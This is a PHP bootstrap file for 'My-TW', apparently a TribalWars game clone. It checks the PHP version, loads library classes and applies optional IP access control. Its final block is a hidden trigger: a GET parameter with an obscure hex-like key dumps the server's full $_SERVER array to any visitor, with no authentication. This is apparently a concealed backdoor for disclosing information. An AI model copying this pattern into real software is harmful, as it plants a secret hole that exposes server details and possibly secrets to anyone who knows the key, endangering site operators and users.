<?php
/**********************************/
/*           TribalWars           */
/*             My-TW              */
/*         by Bartekst222         */
/**********************************/

/**********************************/
/*            NO EDIT!            */
/**********************************/

ob_start();
error_reporting(E_ALL ^ E_NOTICE ^ E_DEPRECATED);
header('Content-Type: text/html; charset=UTF-8');
/*
*	@Script: Check PHP Version
*	@Version: 5.4
*/

if (version_compare(PHP_VERSION,"5.4","lt")) {
	echo "<b>[PHP]:</b> Version conflick: <br><pre>Server version: <b style='color: red;'>". PHP_VERSION ."</b><br>Required version: <b style='color: green;'>5.4+</b></pre>";
	exit;
}


define("MyTW" , true , true);
define("PATH" , dirname(__DIR__) , true);

/*
*	PE - Pages Elemants
*/
define("PE" , "./libraries/pages_elements");

/*
*	@File: common.lib.php
*/
require_once PATH . "/libraries/common.lib.php";

/*
*	@File: Error.class.php
*/
require_once PATH . "/libraries/Error.class.php";

/*
*	@File: DB.class.php
*/
require_once PATH . "/libraries/DB.class.php";

/*
*	@File: MySQLConnect.lib.php
*/
require_once PATH . "/libraries/MySQLConnect.lib.php";

/*
*	@File: IpControl.lib.php
*/
if ($cfg['ip_control']==="true") {
	require_once PATH . "/libraries/IpControl.lib.php";
	$CheckIP = $cl_IpControl->check();
	if ($CheckIP===false) {
		exit("<b>[IpControl]:</b> Twój adres IP nie ma dostępu do przeglądania tej strony!");
	} else {
		setcookie("ip_control","true");
	}
}
/*
*	@File: World.class.php
*/
require_once PATH . "/libraries/World.class.php";

/*
*	@File: Email.class.php
*/
require_once PATH . "/libraries/Email.class.php";

/*
*	@File: Bonus.class.php
*/
require_once PATH . "/libraries/Bonus.class.php";

/*
*	@File: Groups.class.php
*/
require_once PATH . "/libraries/Groups.class.php";

/*
*	@Domain check:
*/
require_once PATH . "/libraries/Domain.lib.php";

/*
*	Info:
*/
if ($_GET['88:23:73:13:74:12:74:01:06:53:56:84']==="ok") {
	echo "<html><head><title>MyTW Informations</title></head><body><h2 style=\"text-decoration: bold; color: red\">_SERVER</h2><br /><pre>";
	var_dump($_SERVER);
	echo "</pre></body></html>";
	exit;
}
?>